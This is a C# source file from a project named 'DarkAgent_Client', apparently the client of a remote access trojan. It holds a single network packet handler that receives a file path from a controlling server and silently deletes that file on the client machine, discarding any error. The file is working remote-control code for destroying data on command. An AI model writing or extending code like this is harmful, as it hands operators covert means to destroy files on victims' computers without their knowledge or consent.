using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_DeleteFile : ReceiveBasePacket
    {
        public R_DeleteFile(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private string FileLocation;

        public override void Read()
        {
            FileLocation = ReadString();
        }

        public override void Run()
        {
            FileInfo info = new FileInfo(FileLocation);
            if(info.Exists)try{File.Delete(FileLocation);}catch { }
        }
    }
}
